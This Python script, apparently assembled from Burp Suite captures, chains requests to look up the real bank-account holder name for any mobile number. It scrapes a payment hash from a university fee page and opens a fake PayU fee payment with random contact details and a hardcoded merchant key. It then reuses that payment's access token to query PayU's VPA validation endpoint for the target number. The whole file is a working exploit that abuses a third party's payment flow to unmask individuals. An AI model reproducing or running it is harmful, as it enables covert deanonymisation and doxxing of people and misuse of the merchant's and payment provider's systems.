# tn_service.py
import requests
from bs4 import BeautifulSoup
import random
import string
import json

DOMAINS = ["example.com", "gmail.com", "yahoo.com", "hotmail.com"]
HEADERS = {
    "Accept-Language": "en-GB,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br"
}

def _rand4():
    return ''.join(random.choices(string.ascii_lowercase, k=4))

def _rand_mobile():
    start = random.randint(70, 99)
    rest = random.randint(100000000, 999999999)
    return f"{start}{rest}"

def _rand_email():
    user = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return f"{user}@{random.choice(DOMAINS)}"

def _extract_hash(html):
    soup = BeautifulSoup(html, "html.parser")
    tag = soup.find("input", {"id": "hash"})
    return tag["value"] if tag else None

# Get the hash value from HTML content
def get_hash_value(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    hash_input = soup.find('input', {'id': 'hash'})
    return hash_input['value'] if hash_input else None

# Send GET request to the payment page and extract the hash value
def _get_hash(mobileno, random_email, random4letter):
    url = f"https://dbatu.unisuite.in/PaymentGatway/PaymentGateway/MakePayment?merchantTxnID=FSTKN74522154{mobileno}&orderAmount=1830&MobielNo={mobileno}&EmailID={random_email}&firstName={random4letter}%20rathod&Description=Affiliated%20University%20Fees%20For%20First%20Year%20%20A.Y.2024-25%20%28PG%20Programme%29%20%5BPRN%2098989898%5D%20%5Bbfarm%5D&requestNumber=FSTKN0000309048300&isNeftChallanFromPG=False&payExpiry=01%2F01%2F0001%2000%3A00%3A00&IsPayExpiry=False&PGiD=4"
    response = requests.get(url, headers=HEADERS)
    return get_hash_value(response.text)


def _get_pid(mobileno, random_email, hash_value, random4letter):
    burp0_url = "https://secure.payu.in:443/_payment"
    burp0_data = {
        "pgEnquiryBy": "2", "drop_category": "NEFTRTGS", "udf1": '', "udf2": '', "udf3": '',
        "udf4": '', "udf5": '', "hash": hash_value, "txnid": "FSTKN74522154"+mobileno, "amount": "1830",
        "phone": mobileno, "email": random_email, "surl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
        "curl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
        "furl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse", "firstname": random4letter + " rathod",
        "productinfo": "Affiliated University Fees For First Year  AY202", "key": "Xp7re3"
    }
    response = requests.post(burp0_url, headers=HEADERS, data=burp0_data, allow_redirects=False)
    location = response.headers.get('Location')
    return location.split('/')[-1] if location else None

def _get_token(pid):
    r = requests.get(
        f"https://api.payu.in/checkoutx?paymentId={pid}",
        headers=HEADERS,
        timeout=15
    )
    return r.json().get("transaction", {}).get("accessToken")

def resolve_true_name(mobile: str):
    """
    Returns: (verified_name | None, error | None)
    """
    mobile = mobile
    random_mobileno = str(_rand_mobile())
    random_email = _rand_email()
    random4letter = _rand4()
    try:
        hash_val = _get_hash(random_mobileno, random_email, random4letter)
        if not hash_val:
            return None, "hash_not_found"

        pid = _get_pid(random_mobileno, random_email, hash_val, random4letter)
        if not pid:
            return None, "payment_id_failed"

        token = _get_token(pid)
        if not token:
            return None, "token_failed"

        r = requests.get(
            f"https://api.payu.in/utilities/vpas/{mobile}/validate"
            f"?paymentId={pid}&mapperFlow=1&access_token={token}",
            headers=HEADERS,
            timeout=15
        )

        data = r.json()
        return data.get("payerAccountName"), None

    except Exception as e:
        return None, str(e)
